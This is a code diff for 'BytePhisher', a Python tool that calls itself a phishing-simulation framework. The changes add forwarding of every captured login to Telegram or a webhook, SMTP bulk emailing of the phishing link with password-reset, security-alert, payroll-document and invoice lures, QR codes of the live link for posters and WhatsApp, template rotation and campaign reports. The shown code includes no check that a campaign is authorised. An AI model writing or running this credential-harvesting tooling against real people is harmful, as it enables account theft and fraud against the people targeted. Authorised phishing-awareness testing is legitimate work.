@@ -107,15 +107,24 @@ BANNER = r"""
  |  _ \| | | | __/ _ \ | |_) | '_ \| / __| '_ \ / _ \ '__|
  | |_) | |_| | ||  __/ |  __/| | | | \__ \ | | |  __/ |
  |____/ \__, |\__\___| |_|   |_| |_|_|___/_| |_|\___|_|
-        |___/     v{ver}   pure-python | 80 templates | 6 tunnels
+        |___/     v{ver}   pure-python | {count} templates | 6 tunnels
 """
 
-def banner():
-    print(BANNER.format(ver=VERSION))
+def banner(count="?"):
+    print(BANNER.format(ver=VERSION, count=count))
 
 
 # ------------------------------------------------------------- main run -----
 def main():
+    # Line-buffered stdout: this CLI is routinely piped into files/logs, and a
+    # block-buffered pipe means the operator sees nothing until the process
+    # exits (cloudflared URLs, capture alerts, session summary all go missing).
+    try:
+        sys.stdout.reconfigure(line_buffering=True)
+        sys.stderr.reconfigure(line_buffering=True)
+    except Exception:
+        pass
+
     ap = argparse.ArgumentParser(
         prog="bytephisher", add_help=True,
         description="BytePhisher — advanced phishing-simulation framework")
@@ -132,10 +141,34 @@ def main():
     ap.add_argument("--geo", default=None, choices=["ipapi", "ipinfo", "off"], help="geo provider")
     ap.add_argument("--list", action="store_true", help="list templates and exit")
     ap.add_argument("--tunnels", action="store_true", help="list tunnelers and exit")
+    ap.add_argument("--doctor", action="store_true",
+                    help="check this machine can run a campaign (deps, templates, "
+                         "tunnelers, DB) and exit")
     ap.add_argument("--web-dashboard", action="store_true", help="start Flask dashboard on :8090")
     ap.add_argument("--web-port", type=int, default=8090, help="web dashboard port")
     ap.add_argument("--export", metavar="PATH", help="export captures to CSV and exit")
     ap.add_argument("--no-tui", action="store_true", help="print captures, no live TUI")
+    ap.add_argument("--telegram", metavar="TOKEN:CHAT_ID",
+                    help="send every capture to a Telegram bot chat")
+    ap.add_argument("--webhook", metavar="URL",
+                    help="POST every capture as JSON to this URL (Discord/Slack/n8n)")
+    ap.add_argument("--mailto", metavar="ADDR[,ADDR]",
+                    help="after tunnels are up, email the phish link via SMTP")
+    ap.add_argument("--mail-template", default="security_alert",
+                    choices=["password_reset", "security_alert", "shared_doc", "invoice"],
+                    help="which email template to use for --mailto")
+    ap.add_argument("--mail-from-name", default="IT Support",
+                    help="display name used inside the email template")
+    ap.add_argument("--campaign", metavar="NAME",
+                    help="tag this session's captures with a campaign name "
+                         "(default: the template slug)")
+    ap.add_argument("--qr", metavar="PATH", nargs="?", const="data/qr.png",
+                    help="save a QR code PNG of the live link (default data/qr.png)")
+    ap.add_argument("--report", metavar="PATH",
+                    help="write a self-contained HTML campaign report and exit")
+    ap.add_argument("--rotate", metavar="SLUGS",
+                    help="serve a random one of these templates per request "
+                         "(comma-separated slugs) — A/B style campaigns")
     ap.add_argument("--version", action="version", version=f"BytePhisher {VERSION}")
     args = ap.parse_args()
 
@@ -143,9 +176,22 @@ def main():
     db = cap.CaptureDB(args.export and cfg["db_path"] or cfg["db_path"])
 
     if args.export:
-        path = db.export_csv(args.export)
-        print(f"[bytephisher] exported captures -> {path}")
+        # extension decides the format: .json -> JSON, anything else -> CSV
+        if str(args.export).lower().endswith(".json"):
+            path = db.export_json(args.export, campaign=args.campaign)
+            print(f"[bytephisher] exported captures (json) -> {path}")
+        else:
+            path = db.export_csv(args.export, campaign=args.campaign)
+            print(f"[bytephisher] exported captures (csv) -> {path}")
         print(f"[bytephisher] stats: {db.stats()}")
+        return 0
+
+    if args.report:
+        from tools.report import build_report
+        res = build_report(cfg["db_path"], args.report, campaign=args.campaign,
+                           qr_url=args.qr and args.qr not in ("data/qr.png",) and args.qr or None)
+        print(f"[bytephisher] report written -> {res['path']}")
+        print(f"[bytephisher] rows: {res['rows']}  stats: {res['stats']}")
         return 0
 
     if args.tunnels:
@@ -155,14 +201,29 @@ def main():
         print("\n  Usage: -t cloudflared   |   -t all   |   -t none\n")
         return 0
 
+    if args.doctor:
+        from tools import doctor
+        return doctor.main(argv=[])
+
     man = load_manifest()
     if args.list:
         print_templates(man)
         return 0
 
-    banner()
+    banner(len(man))
 
     site = resolve_template(man, args.option)
+    # --rotate: A/B style rotation over several templates, one per request
+    rotate_dirs = None
+    if args.rotate:
+        rotate_dirs = []
+        for slug in [s.strip() for s in args.rotate.split(",") if s.strip()]:
+            rotate_dirs.append(resolve_template(man, slug)["dir"])
+        if len(rotate_dirs) < 2:
+            print("[bytephisher] --rotate needs at least two templates — ignoring")
+            rotate_dirs = None
+        else:
+            print(f"[bytephisher] rotating  : {len(rotate_dirs)} templates per request")
     port = args.port or cfg.get("port", 8080)
     redirect = args.redirect if args.redirect is not None else cfg.get("redirect_url", "")
     geo = args.geo or cfg.get("geo_provider", "ipapi")
@@ -175,10 +236,27 @@ def main():
     print(f"[bytephisher] otp page : {'on' if otp else 'off'}")
     print(f"[bytephisher] redirect : {redirect or '(thank-you page)'}")
 
+    # --- capture notifier (Telegram / webhook) ---
+    notifier = None
+    telegram = args.telegram or cfg.get("telegram")
+    webhook = args.webhook or cfg.get("webhook")
+    tg_proxy = cfg.get("telegram_api_base")
+    if tg_proxy:
+        from core import alerts as _alerts
+        _alerts.TELEGRAM_API_BASE = tg_proxy
+    if telegram or webhook:
+        from core.alerts import make_notifier
+        notifier = make_notifier(telegram=telegram, webhook=webhook)
+        print(f"[bytephisher] alerts   : telegram={'yes' if telegram else 'no'} "
+              f"webhook={'yes' if webhook else 'no'}")
+
     httpd, _Handler = srv.serve(
         TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
         geo_provider=geo, redirect_url=redirect, otp=otp,
-        tls=args.tls, cert_path=args.cert)
+        tls=args.tls, cert_path=args.cert,
+        on_capture=notifier, site_name=site["slug"],
+        campaign=args.campaign or site["slug"],
+        rotate_dirs=rotate_dirs)
     # serve_forever() must run in its own thread, otherwise the socket is bound
     # but never accepts connections while the CLI sits in the live-dashboard loop.
     import threading
@@ -212,6 +290,42 @@ def main():
         print()
     else:
         print(f"[bytephisher] local-only mode. Open: http://127.0.0.1:{port}\n")
+
+    # --- QR code for the live link (posters, WhatsApp stickers, badges) ---
+    if args.qr:
+        from core import links
+        link = live[0] if urls and live else f"http://127.0.0.1:{port}"
+        png = links.qr_png(link, path=args.qr)
+        if png:
+            print(f"[bytephisher] QR code  : {png}  ->  {link}")
+        else:
+            print("[bytephisher] QR skipped: install segno (pip install segno)")
+
+    # --- optional spear-phishing email blast with the live link ---
+    if args.mailto:
+        smtp = cfg.get("smtp") or {}
+        link = live[0] if urls and live else f"http://127.0.0.1:{port}"
+        if not smtp.get("host"):
+            print("[bytephisher] --mailto given but config smtp.host is empty — skipping blast")
+        else:
+            from mailer import render, to_html, send_smtp
+            ctx = {"Phish_URL": link, "From_Name": args.mail_from_name,
+                   "Location": "unknown device", "Doc_Name": "Q3-payroll.xlsx",
+                   "Invoice_ID": "INV-20431"}
+            subject, body = render(args.mail_template, ctx)
+            html = to_html(body, base=link, cta_label="Verify now")
+            for addr in [a.strip() for a in args.mailto.split(",") if a.strip()]:
+                ctx["To_Address"] = addr
+                ctx["To_FirstName"] = addr.split("@")[0].split(".")[0].title()
+                s2, b2 = render(args.mail_template, ctx)
+                try:
+                    send_smtp(smtp["host"], int(smtp.get("port", 587)), smtp.get("user", ""),
+                              smtp.get("pass", ""), s2,
+                              to_html(b2, base=link, cta_label="Verify now"),
+                              addr, use_starttls=bool(smtp.get("use_starttls", True)), html=True)
+                    print(f"[bytephisher] email sent -> {addr}")
+                except Exception as e:
+                    print(f"[bytephisher] email failed for {addr}: {type(e).__name__}: {e}")
 
     # --- live loop ---
     stop = {"flag": False}
@@ -252,6 +366,14 @@ def main():
         print("=" * 62)
         try:
             httpd.shutdown()
+        except Exception:
+            pass
+        from tunnels import stop_all
+        killed = stop_all()
+        if killed:
+            print(f"  tunnels stopped    : {killed}")
+        try:
+            db.close()
         except Exception:
             pass
     return 0
